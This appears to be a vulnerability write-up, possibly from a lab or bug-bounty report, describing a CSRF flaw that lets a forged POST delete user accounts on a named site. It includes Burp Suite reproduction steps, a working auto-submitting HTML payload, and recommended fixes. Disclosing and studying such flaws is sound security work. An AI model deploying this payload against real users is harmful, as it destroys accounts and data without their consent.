# Cross-Site Request Forgery (CSRF) Leading to Unauthorized Account Deletion

## Vulnerability Type

Cross-Site Request Forgery (CSRF)

## Summary

The application allows authenticated users to permanently delete their accounts through a POST request without implementing anti-CSRF protections.

An attacker can craft a malicious webpage that automatically submits an account deletion request on behalf of an authenticated victim, resulting in complete and irreversible deletion of the victim's account and associated data.

## Vulnerable Endpoint

```http
https://kzlabs.in/1309.php?action=delete
```

## Steps to Reproduce

1. Log in to the application.
2. Navigate to the Account page.
3. Initiate the account deletion process and intercept the request using Burp Suite.
4. Observe that the request does not contain a CSRF token.
5. Right-click the request and select **Engagement Tools → Generate CSRF PoC**.
6. Save the generated HTML file.
7. Open the HTML file while authenticated to the application.
8. Observe that the account is deleted automatically without user interaction.

## Payload Used

```html
<html>
<body>
<form action="https://kzlabs.in/1309.php?action=delete" method="POST">
<input type="submit" value="Submit request" />
</form>

<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

## Proof of Concept

The application accepts a forged account deletion request and permanently deletes the victim's account using the victim's active authenticated session.

## Impact

* Permanent deletion of user accounts
* Loss of all associated account data
* Denial of service against legitimate users
* Abuse of authenticated user sessions without user consent

## Recommendations for Fix

* Implement anti-CSRF tokens for all state-changing requests
* Validate the `Origin` and `Referer` headers
* Use `SameSite=Lax` or `SameSite=Strict` cookies
* Require password confirmation before account deletion
* Require explicit user interaction and re-authentication for destructive actions
